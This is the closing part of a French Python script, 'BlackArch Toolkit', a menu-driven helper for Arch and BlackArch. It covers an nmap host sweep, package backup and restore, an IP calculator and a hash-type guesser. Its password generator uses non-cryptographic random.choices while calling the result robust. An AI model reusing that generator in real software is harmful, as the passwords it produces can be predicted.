        run(["nmap", "-sn", target])
    elif choice == "3":
        run(["ss", "-tulnp"])
    elif choice == "4":
        run(["ping", "-c", "3", "8.8.8.8"])


def password_generator():
    section("Générateur de mots de passe")
    try:
        length = int(safe_input("Longueur (défaut 24): ").strip() or "24")
    except ValueError:
        length = 24
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{}|;:,.<>?"
    pwd = "".join(random.choices(alphabet, k=length))
    print(f"{G}Mot de passe généré:{D} {pwd}")
    print(f"{Y}SHA256:{D} {hashlib.sha256(pwd.encode()).hexdigest()}")


def ip_validator():
    section("Validateur IP / CIDR")
    value = safe_input("Entrez une IP ou un CIDR: ").strip()
    try:
        network = ipaddress.ip_network(value, strict=False)
        print(f"{G}Réseau:{D} {network}")
        print(f"{G}Netmask:{D} {network.netmask}")
        print(f"{G}Broadcast:{D} {network.broadcast_address}")
        print(f"{G}Hôtes utilisables:{D} {network.num_addresses - 2 if network.num_addresses > 2 else network.num_addresses}")
        print(f"{G}Premier hôte:{D} {network.network_address + 1 if network.num_addresses > 1 else network.network_address}")
        print(f"{G}Dernier hôte:{D} {network.broadcast_address - 1 if network.num_addresses > 1 else network.broadcast_address}")
    except ValueError as exc:
        error(f"Entrée invalide: {exc}")


def hash_crack_helper():
    section("Assistant hash")
    h = safe_input("Collez le hash: ").strip()
    if not h:
        return
    length = len(h)
    guesses = []
    if length == 32:
        guesses.append("MD5")
    elif length == 40:
        guesses.append("SHA1")
    elif length == 64:
        guesses.append("SHA256")
    elif length == 128:
        guesses.append("SHA512")
    elif "$1$" in h:
        guesses.append("MD5crypt")
    elif "$2a$" in h or "$2b$" in h or "$2y$" in h:
        guesses.append("BCrypt")
    elif "$6$" in h:
        guesses.append("SHA512crypt")
    elif "$apr1$" in h:
        guesses.append("Apache MD5")
    else:
        guesses.append("Type non déterminé automatiquement")
    print(f"{G}Hypothèses:{D} {', '.join(guesses)}")
    print(f"{Y}Recommandation:{D} utiliser hash-identifier ou john --show")


def backup_pkg_list():
    section("Sauvegarde de la liste des paquets")
    out = Path.home() / f"pkglist_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    rc, stdout, _ = run(["pacman", "-Qq"], capture=True)
    if rc == 0:
        out.write_text(stdout, encoding="utf-8")
        success(f"Liste sauvegardée: {out}")
    else:
        error("Impossible d'obtenir la liste des paquets.")


def restore_pkg_list(path: str):
    section("Restauration de paquets")
    p = Path(path)
    if not p.exists():
        error(f"Fichier introuvable: {path}")
        return
    pkgs = [line.strip() for line in p.read_text(encoding="utf-8").splitlines() if line.strip()]
    info(f"{len(pkgs)} paquets à installer.")
    if confirm("Continuer ?"):
        run(["pacman", "-S", "--needed"] + pkgs)
        success("Restauration terminée.")


def show_history():
    section("Historique des actions")
    history = load_history()
    if not history:
        info("Aucun historique.")
        return
    for h in history[-50:]:
        ts = h.get("timestamp", "?")
        action = h.get("action", "?")
        print(f"{DIM}{ts}{D} {C}{action}{D} {h.get('category', '')} {str(h.get('packages', ''))[:60]}")


def show_readme_guide():
    section("Guide d'utilisation")
    guide = """
    Bienvenue dans BlackArch Toolkit v2026.7.

    Ce script est divisé en plusieurs modules:
    1. Installation BlackArch — installe le dépôt officiel strap.sh.
    2. Catégories — installe des groupes d'outils (recon, webapp, crypto...).
    3. Encyclopédie — recherche et liste les commandes Arch/BlackArch.
    4. Maintenance — mise à jour, nettoyage, optimisation des miroirs.
    5. Audit — informations système, réseau, sécurité.
    6. Utilitaires — générateur de mots de passe, validateur IP, hash helper.

    Conseils:
    - Gardez toujours une sauvegarde avant les mises à jour majeures.
    - Utilisez `pacman -Syu` régulièrement.
    - Pour l'AUR, préférez yay ou paru plutôt que makepkg manuel.
    - Documentez vos actions avec l'historique intégré.

    Ressources officielles:
    - BlackArch: https://blackarch.org/
    - Arch Wiki: https://wiki.archlinux.org/
    - Pacman Rosetta: https://wiki.archlinux.org/title/Pacman/Rosetta
    """
    print(textwrap.dedent(guide))


def interactive_menu():
    while True:
        print_banner()
        print(f"{BOLD}{Y}MENU PRINCIPAL{D}")
        print(f"  {G}1.{D} Installer le dépôt BlackArch")
        print(f"  {G}2.{D} Voir les catégories d'outils")
        print(f"  {G}3.{D} Installer une catégorie d'outils")
        print(f"  {G}4.{D} Rechercher une commande")
        print(f"  {G}5.{D} Lister toutes les commandes")
        print(f"  {G}6.{D} Exporter les commandes")
        print(f"  {G}7.{D} Mettre à jour le système")
        print(f"  {G}8.{D} Nettoyer le système")
        print(f"  {G}9.{D} Optimiser les miroirs")
        print(f"  {G}10.{D} Audit système")
        print(f"  {G}11.{D} Outils réseau")
        print(f"  {G}12.{D} Générateur de mot de passe")
        print(f"  {G}13.{D} Validateur IP/CIDR")
        print(f"  {G}14.{D} Assistant hash")
        print(f"  {G}15.{D} Sauvegarder liste des paquets")
        print(f"  {G}16.{D} Restaurer liste des paquets")
        print(f"  {G}17.{D} Historique")
        print(f"  {G}18.{D} Guide d'utilisation")
        print(f"  {R}0.{D} Quitter")
        choice = safe_input(f"\n{Y}Ton choix: {D}").strip()

        if choice == "1":
            install_blackarch_strap()
        elif choice == "2":
            list_categories()
        elif choice == "3":
            cat = safe_input("Nom de la catégorie: ").strip().lower()
            install_category(cat)
        elif choice == "4":
            term = safe_input("Terme de recherche: ").strip()
            search_command(term)
        elif choice == "5":
            list_all_commands()
        elif choice == "6":
            fmt = safe_input("Format (json/markdown): ").strip().lower()
            out = safe_input("Fichier de sortie: ").strip()
            if not out:
                out = f"commands.{fmt if fmt in ('json', 'markdown') else 'json'}"
            export_commands(fmt, out)
        elif choice == "7":
            update_system()
        elif choice == "8":
            clean_system()
        elif choice == "9":
            mirror_optimization()
        elif choice == "10":
            system_audit()
        elif choice == "11":
            network_tools_menu()
        elif choice == "12":
            password_generator()
        elif choice == "13":
            ip_validator()
        elif choice == "14":
            hash_crack_helper()
        elif choice == "15":
            backup_pkg_list()
        elif choice == "16":
            path = safe_input("Chemin de la liste: ").strip()
            restore_pkg_list(path)
        elif choice == "17":
            show_history()
        elif choice == "18":
            show_readme_guide()
        elif choice == "0":
            print(f"\n{G}Au revoir !{D}")
            break
        else:
            warning("Choix invalide.")
        pause()


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="BlackArch Toolkit — Encyclopédie Arch Linux & Arsenal Pentest",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Exemples:
  {__file__} --menu
  {__file__} --install-category recon
  {__file__} --search nmap
  {__file__} --command-list
  {__file__} --export markdown arch_commands.md
  {__file__} --update
  {__file__} --audit
        """,
    )
    parser.add_argument("-v", "--version", action="version", version=f"%(prog)s {VERSION} '{CODENAME}'")
    parser.add_argument("--menu", action="store_true", help="Lance le menu interactif")
    parser.add_argument("--install-strap", action="store_true", help="Installe BlackArch via strap.sh")
    parser.add_argument("--install-category", metavar="CAT", help="Installe une catégorie d'outils")
    parser.add_argument("--list-categories", action="store_true", help="Liste les catégories disponibles")
    parser.add_argument("--search", metavar="TERM", help="Recherche une commande dans l'encyclopédie")
    parser.add_argument("--command-list", action="store_true", help="Liste toutes les commandes")
    parser.add_argument("--export", nargs=2, metavar=("FMT", "FILE"), help="Exporte les commandes (json/markdown)")
    parser.add_argument("--update", action="store_true", help="Met à jour le système")
    parser.add_argument("--clean", action="store_true", help="Nettoie le système")
    parser.add_argument("--mirrors", action="store_true", help="Optimise les miroirs")
    parser.add_argument("--audit", action="store_true", help="Audit système")
    parser.add_argument("--backup-pkgs", action="store_true", help="Sauvegarde la liste des paquets")
    parser.add_argument("--restore-pkgs", metavar="FILE", help="Restaure des paquets depuis une liste")
    parser.add_argument("--guide", action="store_true", help="Affiche le guide rapide")
    parser.add_argument("--gen-pass", action="store_true", help="Génère un mot de passe robuste")
    parser.add_argument("--ip-info", metavar="IP", help="Affiche les infos d'un réseau IP/CIDR")
    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    cfg = load_config()
    save_config(cfg)

    if args.menu or len(sys.argv) == 1:
        interactive_menu()
        return

    if args.install_strap:
        install_blackarch_strap()
    elif args.install_category:
        install_category(args.install_category)
    elif args.list_categories:
        list_categories()
    elif args.search:
        search_command(args.search)
    elif args.command_list:
        list_all_commands()
    elif args.export:
        export_commands(args.export[0], args.export[1])
    elif args.update:
        update_system()
    elif args.clean:
        clean_system()
    elif args.mirrors:
        mirror_optimization()
    elif args.audit:
        system_audit()
    elif args.backup_pkgs:
        backup_pkg_list()
    elif args.restore_pkgs:
        restore_pkg_list(args.restore_pkgs)
    elif args.guide:
        show_readme_guide()
    elif args.gen_pass:
        password_generator()
    elif args.ip_info:
        ip_validator()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
